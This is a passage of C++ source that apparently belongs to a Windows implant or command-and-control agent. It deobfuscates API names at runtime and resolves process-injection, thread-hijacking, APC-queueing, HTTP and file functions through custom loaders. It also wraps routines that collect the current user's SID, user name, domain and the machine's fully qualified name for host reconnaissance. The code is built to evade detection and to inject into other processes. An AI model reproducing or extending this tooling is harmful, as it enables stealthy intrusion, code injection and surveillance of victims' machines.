	static CHAR strVirtualFree[STRING_VIRTUAL_FREE_LEN + 1] = ""; // "VirtualFree"
	DeobfuscateUtf8String(
		(PCHAR)STRING_VIRTUAL_FREE,
		STRING_VIRTUAL_FREE_LEN,
		strVirtualFree);

	static CHAR strRtlAddFunctionTable[STRING_RTL_ADD_FUNCTION_TABLE_LEN + 1] = ""; // "RtlAddFunctionTable"
	DeobfuscateUtf8String(
		(PCHAR)STRING_RTL_ADD_FUNCTION_TABLE,
		STRING_RTL_ADD_FUNCTION_TABLE_LEN,
		strRtlAddFunctionTable);

	static CHAR strCreatePipe[STRING_CREATE_PIPE_LEN + 1] = ""; // "CreatePipe"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_PIPE,
		STRING_CREATE_PIPE_LEN,
		strCreatePipe);

	static CHAR strGetTempPath2A[STRING_GET_TEMP_PATH2_A_LEN + 1] = ""; // "GetTempPath2A"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_TEMP_PATH2_A,
		STRING_GET_TEMP_PATH2_A_LEN,
		strGetTempPath2A);

	static CHAR strSetFileInformationByHandle[STRING_SET_FILE_INFORMATION_BY_HANDLE_LEN + 1] = ""; // "SetFileInformationByHandle"
	DeobfuscateUtf8String(
		(PCHAR)STRING_SET_FILE_INFORMATION_BY_HANDLE,
		STRING_SET_FILE_INFORMATION_BY_HANDLE_LEN,
		strSetFileInformationByHandle);

	static CHAR strMapViewOfFile3[STRING_MAP_VIEW_OF_FILE3_LEN + 1] = ""; // "MapViewOfFile3"
	DeobfuscateUtf8String(
		(PCHAR)STRING_MAP_VIEW_OF_FILE3,
		STRING_MAP_VIEW_OF_FILE3_LEN,
		strMapViewOfFile3);

	static CHAR strReadFile[STRING_READ_FILE_LEN + 1] = ""; // "ReadFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_READ_FILE,
		STRING_READ_FILE_LEN,
		strReadFile);

	static CHAR strSetThreadContext[STRING_SET_THREAD_CONTEXT_LEN + 1] = ""; // "SetThreadContext"
	DeobfuscateUtf8String(
		(PCHAR)STRING_SET_THREAD_CONTEXT,
		STRING_SET_THREAD_CONTEXT_LEN,
		strSetThreadContext);

	static CHAR strGetThreadContext[STRING_GET_THREAD_CONTEXT_LEN + 1] = ""; // "GetThreadContext"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_THREAD_CONTEXT,
		STRING_GET_THREAD_CONTEXT_LEN,
		strGetThreadContext);

	// Load necessary modules
	loadedModules.hNtdll = LoadLibraryCustom(strNtdllDll);
	loadedModules.hKernelbase = LoadLibraryCustom(strKernelbaseDll);
	loadedModules.hKernel32 = LoadLibraryCustom(strKernel32Dll);
	loadedModules.hUser32 = LoadLibraryCustom(strUser32Dll);
	loadedModules.hWininet = LoadLibraryCustom(strWininetDll);
	loadedModules.hBcrypt = LoadLibraryCustom(strBcryptDll);
	loadedModules.hAdvapi32 = LoadLibraryCustom(strAdvapi32Dll);

	// Save necessary global module handles
	hNtdll = loadedModules.hNtdll;

	// Load necessary functions
	loadedFunctions.MessageBoxA = (int (*)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddressCustom(loadedModules.hUser32, strMessageBoxA);
	loadedFunctions.LoadLibraryA = (HMODULE(*)(LPCSTR lpLibFileName))GetProcAddressCustom(loadedModules.hKernel32, strLoadLibraryA);
	loadedFunctions.FreeLibrary = (BOOL(*)(HMODULE hLibModule))GetProcAddressCustom(loadedModules.hKernel32, strFreeLibrary);
	loadedFunctions.InternetOpenA = (HINTERNET(*)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags))GetProcAddressCustom(loadedModules.hWininet, strInternetOpenA);
	loadedFunctions.InternetConnectA = (HINTERNET(*)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext))GetProcAddressCustom(loadedModules.hWininet, strInternetConnectA);
	loadedFunctions.HttpOpenRequestA = (HINTERNET(*)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)) GetProcAddressCustom(loadedModules.hWininet, strHttpOpenRequestA);
	loadedFunctions.HttpSendRequestA = (BOOL(*)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength))GetProcAddressCustom(loadedModules.hWininet, strHttpSendRequestA);
	loadedFunctions.InternetReadFile = (BOOL(*)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead))GetProcAddressCustom(loadedModules.hWininet, strInternetReadFile);
	loadedFunctions.InternetCloseHandle = (BOOL(*)(HINTERNET hInternet))GetProcAddressCustom(loadedModules.hWininet, strInternetCloseHandle);
	loadedFunctions.InternetSetOptionA = (BOOL(*)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength))GetProcAddressCustom(loadedModules.hWininet, strInternetSetOptionA);
	loadedFunctions.GetProcessHeap = (HANDLE(*)())GetProcAddressCustom(loadedModules.hKernel32, strGetProcessHeap);
	loadedFunctions.HeapAlloc = (LPVOID(*)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes))GetProcAddressCustom(loadedModules.hKernel32, strHeapAlloc);
	loadedFunctions.HeapReAlloc = (LPVOID(*)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes))GetProcAddressCustom(loadedModules.hKernel32, strHeapReAlloc);
	loadedFunctions.HeapFree = (BOOL(*)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem))GetProcAddressCustom(loadedModules.hKernel32, strHeapFree);
	loadedFunctions.GetLastError = (DWORD(*)())GetProcAddressCustom(loadedModules.hKernel32, strGetLastError);
	loadedFunctions.BCryptOpenAlgorithmProvider = (NTSTATUS(*)(BCRYPT_ALG_HANDLE * phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags)) GetProcAddressCustom(loadedModules.hBcrypt, strBCryptOpenAlgorithmProvider);
	loadedFunctions.BCryptCloseAlgorithmProvider = (NTSTATUS(*)(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags))GetProcAddressCustom(loadedModules.hBcrypt, strBCryptCloseAlgorithmProvider);
	loadedFunctions.BCryptGenRandom = (NTSTATUS(*)(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags))GetProcAddressCustom(loadedModules.hBcrypt, strBCryptGenRandom);
	loadedFunctions.CreateThread = (HANDLE(*)(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId))GetProcAddressCustom(loadedModules.hKernel32, strCreateThread);
	loadedFunctions.CreateMutexA = (HANDLE(*)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName))GetProcAddressCustom(loadedModules.hKernel32, strCreateMutexA);
	loadedFunctions.WaitForSingleObject = (DWORD(*)(HANDLE hHandle, DWORD dwMilliseconds))GetProcAddressCustom(loadedModules.hKernel32, strWaitForSingleObject);
	loadedFunctions.ReleaseMutex = (BOOL(*)(HANDLE hMutex))GetProcAddressCustom(loadedModules.hKernel32, strReleaseMutex);
	loadedFunctions.CloseHandle = (BOOL(*)(HANDLE hObject))GetProcAddressCustom(loadedModules.hKernel32, strCloseHandle);
	loadedFunctions.CreateEventA = (HANDLE(*)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName))GetProcAddressCustom(loadedModules.hKernel32, strCreateEventA);
	loadedFunctions.SetEvent = (BOOL(*)(HANDLE hEvent))GetProcAddressCustom(loadedModules.hKernel32, strSetEvent);
	loadedFunctions.ResetEvent = (BOOL(*)(HANDLE hEvent))GetProcAddressCustom(loadedModules.hKernel32, strResetEvent);
	loadedFunctions.GetComputerNameExA = (BOOL(*)(IN COMPUTER_NAME_FORMAT NameType, OUT LPSTR lpBuffer, IN OUT LPDWORD nSize))GetProcAddressCustom(loadedModules.hKernel32, strGetComputerNameExA);
	loadedFunctions.OpenProcessToken = (BOOL(*)(IN HANDLE ProcessHandle, IN DWORD DesiredAccess, OUT PHANDLE TokenHandle))GetProcAddressCustom(loadedModules.hAdvapi32, strOpenProcessToken);
	loadedFunctions.GetTokenInformation = (BOOL(*)(IN HANDLE TokenHandle, IN TOKEN_INFORMATION_CLASS TokenInformationClass, OUT LPVOID TokenInformation, IN DWORD TokenInformationLength, OUT PDWORD ReturnLength))GetProcAddressCustom(loadedModules.hAdvapi32, strGetTokenInformation);
	loadedFunctions.LookupAccountSidA = (BOOL(*)(IN LPCSTR lpSystemName, IN PSID Sid, OUT LPSTR Name, IN LPDWORD cchName, OUT LPSTR ReferencedDomainName, IN OUT LPDWORD cchReferencedDomainName, OUT PSID_NAME_USE peUse))GetProcAddressCustom(loadedModules.hAdvapi32, strLookupAccountSidA);
	loadedFunctions.CreateFileA = (HANDLE(*)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile))GetProcAddressCustom(loadedModules.hKernel32, strCreateFileA);
	loadedFunctions.CreateFileMappingA = (HANDLE(*)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName))GetProcAddressCustom(loadedModules.hKernel32, strCreateFileMappingA);
	loadedFunctions.MapViewOfFile = (LPVOID(*)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap))GetProcAddressCustom(loadedModules.hKernel32, strMapViewOfFile);
	loadedFunctions.GetFileSizeEx = (BOOL(*)(HANDLE hFile, PLARGE_INTEGER lpFileSize))GetProcAddressCustom(loadedModules.hKernel32, strGetFileSizeEx);
	loadedFunctions.UnmapViewOfFile = (BOOL(*)(LPCVOID lpBaseAddress))GetProcAddressCustom(loadedModules.hKernel32, strUnmapViewOfFile);
	loadedFunctions.FlushViewOfFile = (BOOL(*)(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush))GetProcAddressCustom(loadedModules.hKernel32, strFlushViewOfFile);
	loadedFunctions.FlushFileBuffers = (BOOL(*)(HANDLE hFile))GetProcAddressCustom(loadedModules.hKernel32, strFlushFileBuffers);
	loadedFunctions.GetCurrentDirectoryA = (DWORD(*)(DWORD nBufferLength, PCHAR lpBuffer))GetProcAddressCustom(loadedModules.hKernel32, strGetCurrentDirectoryA);
	loadedFunctions.SetCurrentDirectoryA = (BOOL(*)(PCHAR lpPathName))GetProcAddressCustom(loadedModules.hKernel32, strSetCurrentDirectoryA);
	loadedFunctions.GetSecurityInfo = (DWORD(*)(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID * ppsidOwner, PSID * ppsidGroup, PACL * ppDacl, PACL * ppSacl, PSECURITY_DESCRIPTOR * ppSecurityDescriptor)) GetProcAddressCustom(loadedModules.hAdvapi32, strGetSecurityInfo);
	loadedFunctions.LocalFree = (HLOCAL(*)(HLOCAL hMem))GetProcAddressCustom(loadedModules.hKernel32, strLocalFree);
	loadedFunctions.FindFirstFileA = (HANDLE(*)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData))GetProcAddressCustom(loadedModules.hKernel32, strFindFirstFileA);
	loadedFunctions.FindNextFileA = (BOOL(*)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData))GetProcAddressCustom(loadedModules.hKernel32, strFindNextFileA);
	loadedFunctions.FindClose = (BOOL(*)(HANDLE hFindFile))GetProcAddressCustom(loadedModules.hKernel32, strFindClose);
	loadedFunctions.GetFileAttributesA = (DWORD(*)(LPCSTR lpFileName))GetProcAddressCustom(loadedModules.hKernel32, strGetFileAttributesA);
	loadedFunctions.CopyFileA = (BOOL(*)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists))GetProcAddressCustom(loadedModules.hKernel32, strCopyFileA);
	loadedFunctions.CreateDirectoryA = (BOOL(*)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes))GetProcAddressCustom(loadedModules.hKernel32, strCreateDirectoryA);
	loadedFunctions.FileTimeToSystemTime = (BOOL(*)(FILETIME * lpFileTime, LPSYSTEMTIME lpSystemTime)) GetProcAddressCustom(loadedModules.hKernel32, strFileTimeToSystemTime);
	loadedFunctions.GetDateFormatEx = (int (*)(LPCWSTR lpLocaleName, DWORD dwFlags, SYSTEMTIME *lpDate, LPCWSTR lpFormat, LPWSTR lpDateStr, int cchDate, LPCWSTR lpCalendar))GetProcAddressCustom(loadedModules.hKernel32, strGetDateFormatEx);
	loadedFunctions.GetTimeFormatEx = (int (*)(LPCWSTR lpLocaleName, DWORD dwFlags, SYSTEMTIME *lpTime, LPCWSTR lpFormat, LPWSTR lpTimeStr, int cchTime))GetProcAddressCustom(loadedModules.hKernel32, strGetTimeFormatEx);
	loadedFunctions.MoveFileExA = (BOOL(*)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD dwFlags))GetProcAddressCustom(loadedModules.hKernel32, strMoveFileExA);
	loadedFunctions.SetFilePointerEx = (BOOL(*)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod))GetProcAddressCustom(loadedModules.hKernel32, strSetFilePointerEx);
	loadedFunctions.WriteFile = (BOOL(*)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped))GetProcAddressCustom(loadedModules.hKernel32, strWriteFile);
	loadedFunctions.DeleteFileA = (BOOL(*)(LPCSTR lpFileName))GetProcAddressCustom(loadedModules.hKernel32, strDeleteFileA);
	loadedFunctions.RemoveDirectoryA = (BOOL(*)(LPCSTR lpPathName))GetProcAddressCustom(loadedModules.hKernel32, strRemoveDirectoryA);
	loadedFunctions.HeapValidate = (BOOL(*)(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem))GetProcAddressCustom(loadedModules.hKernel32, strHeapValidate);
	loadedFunctions.ConvertSidToStringSidA = (BOOL(*)(PSID Sid, LPSTR * StringSid)) GetProcAddressCustom(loadedModules.hAdvapi32, strConvertSidToStringSidA);
	loadedFunctions.NtQuerySystemInformation = (NTSTATUS(*)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength))GetProcAddressCustom(hNtdll, strNtQuerySystemInformation);
	loadedFunctions.GetEnvironmentVariableA = (DWORD(*)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize))GetProcAddressCustom(loadedModules.hKernel32, strGetEnvironmentVariableA);
	loadedFunctions.OpenProcess = (HANDLE(*)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId))GetProcAddressCustom(loadedModules.hKernel32, strOpenProcess);
	loadedFunctions.CreateProcessA = (BOOL(*)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation))GetProcAddressCustom(loadedModules.hKernel32, strCreateProcessA);
	loadedFunctions.InitializeProcThreadAttributeList = (BOOL(*)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize))GetProcAddressCustom(loadedModules.hKernel32, strInitializeProcThreadAttributeList);
	loadedFunctions.UpdateProcThreadAttribute = (BOOL(*)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize))GetProcAddressCustom(loadedModules.hKernel32, strUpdateProcThreadAttribute);
	loadedFunctions.DeleteProcThreadAttributeList = (void (*)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList))GetProcAddressCustom(loadedModules.hKernel32, strDeleteProcThreadAttributeList);
	loadedFunctions.ReadProcessMemory = (BOOL(*)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead)) GetProcAddressCustom(loadedModules.hKernel32, strReadProcessMemory);
	loadedFunctions.WriteProcessMemory = (BOOL(*)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten)) GetProcAddressCustom(loadedModules.hKernel32, strWriteProcessMemory);
	loadedFunctions.NtQueryInformationProcess = (NTSTATUS(*)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength))GetProcAddressCustom(loadedModules.hNtdll, strNtQueryInformationProcess);
	loadedFunctions.TerminateProcess = (BOOL(*)(HANDLE hProcess, UINT uExitCode))GetProcAddressCustom(loadedModules.hKernel32, strTerminateProcess);
	loadedFunctions.OpenThread = (HANDLE(*)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId))(loadedModules.hKernel32, strOpenThread);
	loadedFunctions.SuspendThread = (DWORD(*)(HANDLE hThread))GetProcAddressCustom(loadedModules.hKernel32, strSuspendThread);
	loadedFunctions.ResumeThread = (DWORD(*)(HANDLE hThread))GetProcAddressCustom(loadedModules.hKernel32, strResumeThread);
	loadedFunctions.DuplicateHandle = (BOOL(*)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions))GetProcAddressCustom(loadedModules.hKernel32, strDuplicateHandle);
	loadedFunctions.NtQueueApcThread = (NTSTATUS(*)(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext OPTIONAL, PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, ULONG ApcReserved OPTIONAL))GetProcAddressCustom(loadedModules.hNtdll, strNtQueueApcThread);
	loadedFunctions.NtTestAlert = (NTSTATUS(*)())GetProcAddressCustom(loadedModules.hNtdll, strNtTestAlert);
	loadedFunctions.CreateRemoteThread = (HANDLE(*)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId))GetProcAddressCustom(loadedModules.hKernel32, strCreateRemoteThread);
	loadedFunctions.GetProcAddress = (FARPROC(*)(HMODULE hModule, LPCSTR lpProcName))GetProcAddressCustom(loadedModules.hKernel32, strGetProcAddress);
	loadedFunctions.VirtualProtectEx = (BOOL(*)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect))GetProcAddressCustom(loadedModules.hKernel32, strVirtualProtectEx);
	loadedFunctions.VirtualAllocEx = (LPVOID(*)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect))GetProcAddressCustom(loadedModules.hKernel32, strVirtualAllocEx);
	loadedFunctions.VirtualFree = (BOOL(*)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType))GetProcAddressCustom(loadedModules.hKernel32, strVirtualFree);
	loadedFunctions.RtlAddFunctionTable = (BOOLEAN(*)(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, DWORD64 BaseAddress))GetProcAddressCustom(loadedModules.hKernel32, strRtlAddFunctionTable);
	loadedFunctions.MapViewOfFile3 = (PVOID(*)(HANDLE FileMapping, HANDLE Process, PVOID BaseAddress, ULONG64 Offset, SIZE_T ViewSize, ULONG AllocationType, ULONG PageProtection, MEM_EXTENDED_PARAMETER * ExtendedParameters, ULONG ParameterCount)) GetProcAddressCustom(loadedModules.hKernel32, strMapViewOfFile3);
	loadedFunctions.CreatePipe = (BOOL(*)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize))GetProcAddressCustom(loadedModules.hKernel32, strCreatePipe);
	loadedFunctions.GetTempPath2A = (DWORD(*)(DWORD BufferLength, LPSTR Buffer))GetProcAddressCustom(loadedModules.hKernel32, strGetTempPath2A);
	loadedFunctions.SetFileInformationByHandle = (BOOL(*)(HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize))GetProcAddressCustom(loadedModules.hKernel32, strSetFileInformationByHandle);
	loadedFunctions.ReadFile = (BOOL(*)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped))GetProcAddressCustom(loadedModules.hKernel32, strReadFile);
	loadedFunctions.SetThreadContext = (BOOL(*)(HANDLE hThread, const CONTEXT *lpContext))GetProcAddressCustom(loadedModules.hKernel32, strSetThreadContext);
	loadedFunctions.GetThreadContext = (BOOL(*)(HANDLE hThread, LPCONTEXT lpContext))GetProcAddressCustom(loadedModules.hKernel32, strGetThreadContext);
}

/* Destructor for WinApiCustom */
WinApiCustom::~WinApiCustom()
{
	// Free library (modules)
	// FreeLibraryCustom(loadedModules.hKernel32); TODO
	// FreeLibraryCustom(loadedModules.hUser32);
}

/* WRAPPER FUNCTIONS FOR WinApiCustom */

// Custom heap alloc
LPVOID WinApiCustom::HeapAllocCustom(DWORD sizeOfBufferToAllocate)
{
	return this->loadedFunctions.HeapAlloc(
		this->loadedFunctions.GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeOfBufferToAllocate);
}

// Custom heap free
BOOL WinApiCustom::HeapFreeCustom(LPVOID pBufferToFree)
{
	return this->loadedFunctions.HeapFree(
		this->loadedFunctions.GetProcessHeap(),
		0,
		pBufferToFree);
}

// Custom Heap realloc
LPVOID WinApiCustom::HeapReAllocCustom(LPVOID lpMem, DWORD dwBytes)
{
	return this->loadedFunctions.HeapReAlloc(
		this->loadedFunctions.GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		lpMem,
		dwBytes);
}

// Custom CreateThread
HANDLE WinApiCustom::CreateThreadCustom(LPTHREAD_START_ROUTINE pThreadFunc, LPVOID pThreadFuncParams)
{
	return this->loadedFunctions.CreateThread(
		NULL,
		0,
		pThreadFunc,
		pThreadFuncParams,
		0,
		NULL);
}

// Custom CreateMutex
HANDLE WinApiCustom::CreateMutexCustom()
{
	return this->loadedFunctions.CreateMutexA(NULL, FALSE, NULL);
}

/* Get current process handle */
inline HANDLE WinApiCustom::GetCurrentProcessHandlePseudo()
{
	return (HANDLE)-1;
}

/* Get current thread's pseudo handle */
inline HANDLE WinApiCustom::GetCurrentThreadHandlePseudo()
{
	return (HANDLE)-2;
}

/*
Get current user name wrapper

Returned double-pointers point to buffers that must be manually freed
*/
void WinApiCustom::GetCurrentUserCustom(OUT CHAR **ppSidString, OUT CHAR **ppUserName, OUT CHAR **ppDomainName)
{
	// Initialise data
	HANDLE hCurrentProcessToken = NULL;

	// Get handle to current process's token
	this->loadedFunctions.OpenProcessToken(
		this->GetCurrentProcessHandlePseudo(),
		TOKEN_QUERY,
		&hCurrentProcessToken);
	if (hCurrentProcessToken == NULL)
		goto CLEANUP;

	// Get token's user's SID
	DWORD tokenUserSize = 0;
	this->loadedFunctions.GetTokenInformation(
		hCurrentProcessToken,
		TokenUser,
		NULL,
		0,
		&tokenUserSize);
	if (tokenUserSize == NULL)
		goto CLEANUP;

	PTOKEN_USER pTokenUser = (PTOKEN_USER)(this->HeapAllocCustom(tokenUserSize));
	if (pTokenUser == NULL)
		goto CLEANUP;

	this->loadedFunctions.GetTokenInformation(
		hCurrentProcessToken,
		TokenUser,
		pTokenUser,
		tokenUserSize,
		&tokenUserSize);

	PSID pTokenUserSid = pTokenUser->User.Sid;
	if (pTokenUserSid == NULL)
		goto CLEANUP;

	// Lookup user with above found SID
	this->DescribeSid(
		pTokenUserSid,
		ppSidString,
		ppUserName,
		ppDomainName);

CLEANUP:
	if (hCurrentProcessToken != NULL)
		this->loadedFunctions.CloseHandle(hCurrentProcessToken);
}

/*
Get FQDN of computer

Returned pointer points to buffer that must be manually freed
*/
LPVOID WinApiCustom::GetFQDNComputer()
{
	DWORD size = 0;
	this->loadedFunctions.GetComputerNameExA(
		COMPUTER_NAME_FORMAT::ComputerNameDnsFullyQualified,
		NULL,
		&size);

	if (size == 0)
		return NULL;

	LPVOID computerNameBuf = this->HeapAllocCustom(size);
	if (computerNameBuf == NULL)
		return NULL;

	if (!this->loadedFunctions.GetComputerNameExA(
			COMPUTER_NAME_FORMAT::ComputerNameDnsFullyQualified,
			(LPSTR)computerNameBuf,
			&size))
		return NULL;

	return computerNameBuf;
}
